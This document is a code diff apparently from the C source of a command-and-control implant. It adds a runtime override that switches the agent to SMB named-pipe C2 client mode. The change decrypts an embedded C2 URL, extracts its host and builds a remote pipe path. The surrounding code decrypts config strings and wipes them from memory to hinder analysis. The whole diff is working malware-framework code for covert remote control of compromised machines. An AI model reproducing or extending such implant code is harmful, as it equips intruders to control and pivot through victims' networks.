@@ -15,28 +15,61 @@
  */
 #include "agent.h"
 
+/* ─── C2 SMB override globals (set from command-line C2SMB:<pipe>) ─── */
+BOOL g_c2smb_override = FALSE;
+char g_c2smb_pipe[256] = {0};
+
 /* ─── SMB Client (connect to pipe for C2) ─── */
 
 static HANDLE g_pipe_client = INVALID_HANDLE_VALUE;
 
 BOOL smb_init(void) {
-    if (CONFIG_PIPE_ENABLED != 2) return FALSE; /* 2 = client mode */
-
-    /* Build pipe path: \\<host>\pipe\<name> or \\.\pipe\<name> */
-    char pipe_name_dec[256];
-    DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
-    char pipe_host_dec[256];
-    DECRYPT_CONFIG(pipe_host_dec, PIPE_HOST);
+    /*
+     * Two ways to enter SMB client mode:
+     *   1. Compiled config: CONFIG_PIPE_ENABLED == 2
+     *   2. Runtime override: g_c2smb_override == TRUE (from C2SMB:<pipe> cmdline arg)
+     */
+    if (!g_c2smb_override && CONFIG_PIPE_ENABLED != 2) return FALSE;
 
     char pipe_path[512];
-    if (pipe_host_dec[0] != '\0') {
+
+    if (g_c2smb_override) {
+        /* Runtime override: extract C2 host from baked-in CONFIG_C2_URL.
+         * URL format: "https://host:port/path" — we need just the host. */
+        char c2_url[512];
+        DECRYPT_CONFIG(c2_url, C2_URL);
+        char host[256] = {0};
+        {
+            char *p = c2_url;
+            /* Skip "https://" or "http://" */
+            if (strncmp(p, "https://", 8) == 0) p += 8;
+            else if (strncmp(p, "http://", 7) == 0) p += 7;
+            int i = 0;
+            while (*p && *p != ':' && *p != '/' && i < 255)
+                host[i++] = *p++;
+            host[i] = '\0';
+        }
+        SecureZeroMemory(c2_url, sizeof(c2_url));
+
         snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s",
-                 pipe_host_dec, pipe_name_dec + 9); /* Skip \\.\pipe\ prefix */
+                 host, g_c2smb_pipe);
+        SecureZeroMemory(host, sizeof(host));
     } else {
-        strncpy(pipe_path, pipe_name_dec, sizeof(pipe_path) - 1);
+        /* Compiled config path (original logic) */
+        char pipe_name_dec[256];
+        DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
+        char pipe_host_dec[256];
+        DECRYPT_CONFIG(pipe_host_dec, PIPE_HOST);
+
+        if (pipe_host_dec[0] != '\0') {
+            snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s",
+                     pipe_host_dec, pipe_name_dec + 9); /* Skip \\.\pipe\ prefix */
+        } else {
+            strncpy(pipe_path, pipe_name_dec, sizeof(pipe_path) - 1);
+        }
+        SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
+        SecureZeroMemory(pipe_host_dec, sizeof(pipe_host_dec));
     }
-    SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
-    SecureZeroMemory(pipe_host_dec, sizeof(pipe_host_dec));
 
     wchar_t wPipePath[512];
     MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);
